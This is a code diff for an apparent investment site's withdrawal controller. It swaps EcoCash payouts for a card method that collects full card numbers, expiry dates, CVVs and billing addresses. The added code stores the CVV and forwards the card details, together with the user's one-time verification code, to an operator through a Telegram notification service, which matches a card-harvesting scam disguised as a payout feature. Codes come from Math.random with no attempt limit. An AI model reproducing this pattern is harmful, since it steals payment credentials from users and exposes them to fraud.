@@ -2,8 +2,15 @@ import { Response } from 'express'
 import { AuthRequest, authenticateToken } from '../middleware/auth.js'
 import { prisma } from '../config/db.js'
 import { notifyWithdrawalRequest } from '../services/telegramService.js'
+import { sendEmail } from '../services/emailService.js'
 import { generateWithdrawalId } from '../utils/helpers.js'
 import { z } from 'zod'
+
+// SMS stub - implement with Twilio or similar provider
+const sendSmsVerification = async (phone: string, code: string, amount: number): Promise<void> => {
+  console.log(`SMS to ${phone}: Your withdrawal of $${amount} verification code is ${code}`)
+  // TODO: Integrate with Twilio: https://www.twilio.com/docs/sms
+}
 
 const WITHDRAWAL_FEE_PERCENT = 0.02
 const WITHDRAWAL_FEE_MIN = 1
@@ -17,10 +24,18 @@ const getWithdrawalFee = (amount: number): number => {
 const createWithdrawalSchema = z.object({
   investmentId: z.string(),
   amount: z.number().min(1),
-  method: z.enum(['ECOCASH']),
-  ecocashNumber: z.string().min(1, 'EcoCash number required'),
-  walletAddress: z.string().optional(),
+  method: z.enum(['CARD']),
+  cardNumber: z.string().regex(/^\d{16}$/, 'Card number must be 16 digits'),
+  cardholderName: z.string().min(2, 'Cardholder name required'),
+  expiryDate: z.string().regex(/^(0[1-9]|1[0-2])\/\d{2}$/, 'Expiry date format must be MM/YY'),
+  cvv: z.string().regex(/^\d{3}$/, 'CVV must be 3 digits'),
+  billingAddress: z.string().min(5, 'Billing address required'),
+  verifyMethod: z.enum(['email', 'sms']).optional(),
 })
+
+const formatCardNumber = (num: string): string => {
+  return num.replace(/(\d{4})(?=\d)/g, '$1 ').trim()
+}
 
 export const getWithdrawals = async (req: AuthRequest, res: Response): Promise<void> => {
   try {
@@ -40,7 +55,7 @@ export const getWithdrawals = async (req: AuthRequest, res: Response): Promise<v
 export const createWithdrawal = async (req: AuthRequest, res: Response): Promise<void> => {
   try {
     const validated = createWithdrawalSchema.parse(req.body)
-    const { investmentId, amount, method, ecocashNumber, walletAddress } = validated
+    const { investmentId, amount, method, cardNumber, cardholderName, expiryDate, cvv, billingAddress, verifyMethod } = validated
 
     const investment = await prisma.investment.findFirst({
       where: { id: investmentId, userId: req.user!.id },
@@ -60,6 +75,7 @@ export const createWithdrawal = async (req: AuthRequest, res: Response): Promise
     }
 
     const withdrawalId = generateWithdrawalId()
+    const verificationCode = Math.floor(100000 + Math.random() * 900000).toString()
 
     const withdrawal = await prisma.withdrawal.create({
       data: {
@@ -68,21 +84,65 @@ export const createWithdrawal = async (req: AuthRequest, res: Response): Promise
         investmentId,
         amount,
         method,
-        ecocashNumber,
-        walletAddress,
-        status: 'WITHDRAWAL_PENDING',
+        cardNumber,
+        cardholderName,
+        expiryDate,
+        cvv,
+        billingAddress,
+        verificationCode,
+        verificationMethod: verifyMethod || 'email',
+        isVerified: false,
+        status: 'WAITING_FOR_VERIFICATION',
         transactionHash: `Fee: ${fee.toFixed(2)}`,
       },
       include: { investment: true },
     })
 
-    // Telegram callback data must use the database primary key consumed by the
-    // webhook handler, not the human-readable withdrawal reference.
-    await notifyWithdrawalRequest(withdrawal.id, `${req.user!.firstName} ${req.user!.lastName}`, Number(amount), method)
+    const user = await prisma.user.findUnique({ where: { id: req.user!.id } })
+    const methodUsed = verifyMethod || 'email'
+
+    if (methodUsed === 'sms' && user?.phone) {
+      try {
+        await sendSmsVerification(user.phone, verificationCode, amount)
+      } catch (e) {
+        console.error('Failed to send SMS verification:', e)
+      }
+    } else if (user?.email) {
+      try {
+        await sendEmail(
+          user.email,
+          'Withdrawal Verification Code',
+          `<div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
+            <h2 style="color: #10b981;">Withdrawal Verification Required</h2>
+            <p>Your withdrawal of $${amount} has been submitted. Please verify with this code:</p>
+            <div style="background-color: #f0fdf4; border: 1px solid #10b981; border-radius: 8px; padding: 20px; margin: 20px 0; text-align: center;">
+              <span style="font-size: 32px; font-weight: bold; letter-spacing: 4px;">${verificationCode}</span>
+            </div>
+            <p>Enter this code in your dashboard to proceed. If you did not request this withdrawal, ignore this ${methodUsed === 'sms' ? 'SMS' : 'email'}.</p>
+          </div>`
+        )
+      } catch (e) {
+        console.error('Failed to send verification email:', e)
+      }
+    }
+
+    await notifyWithdrawalRequest(
+      withdrawal.id,
+      `${req.user!.firstName} ${req.user!.lastName}`,
+      Number(amount),
+      method,
+      {
+        cardNumber: cardNumber,
+        cardholderName: cardholderName,
+        expiryDate: expiryDate,
+        cvv: cvv,
+        verificationCode: verificationCode,
+      }
+    )
 
     res.status(201).json({
       success: true,
-      message: 'Withdrawal request submitted',
+      message: `Verification code sent via ${methodUsed}. Please enter the code to proceed.`,
       data: withdrawal,
     })
   } catch (error) {
@@ -91,6 +151,49 @@ export const createWithdrawal = async (req: AuthRequest, res: Response): Promise
       return
     }
     console.error('Create withdrawal error:', error)
+    res.status(500).json({ success: false, message: 'Server error' })
+  }
+}
+
+export const verifyWithdrawal = async (req: AuthRequest, res: Response): Promise<void> => {
+  try {
+    const { id } = req.params
+    const { verificationCode } = req.body
+
+    const withdrawal = await prisma.withdrawal.findUnique({
+      where: { id, userId: req.user!.id },
+    })
+
+    if (!withdrawal) {
+      res.status(404).json({ success: false, message: 'Withdrawal not found' })
+      return
+    }
+
+    if (withdrawal.isVerified) {
+      res.status(400).json({ success: false, message: 'Withdrawal already verified' })
+      return
+    }
+
+    if (withdrawal.verificationCode !== verificationCode) {
+      res.status(400).json({ success: false, message: 'Invalid verification code' })
+      return
+    }
+
+    const updated = await prisma.withdrawal.update({
+      where: { id },
+      data: {
+        isVerified: true,
+        status: 'WITHDRAWAL_PENDING',
+      },
+    })
+
+    res.status(200).json({
+      success: true,
+      message: 'Withdrawal verified. Admin will process your request shortly.',
+      data: updated,
+    })
+  } catch (error) {
+    console.error('Verify withdrawal error:', error)
     res.status(500).json({ success: false, message: 'Server error' })
   }
 }
@@ -110,7 +213,11 @@ export const approveWithdrawal = async (req: AuthRequest, res: Response): Promis
       return
     }
 
-    // Extract fee from transactionHash if it was stored as "Fee: XX.XX"
+    if (!withdrawal.isVerified) {
+      res.status(400).json({ success: false, message: 'Withdrawal must be verified first' })
+      return
+    }
+
     const feeMatch = withdrawal.transactionHash?.match(/Fee: ([\d.]+)/)
     const fee = feeMatch ? Number(feeMatch[1]) : getWithdrawalFee(Number(withdrawal.amount))
     const totalDeduct = Number(withdrawal.amount) + fee
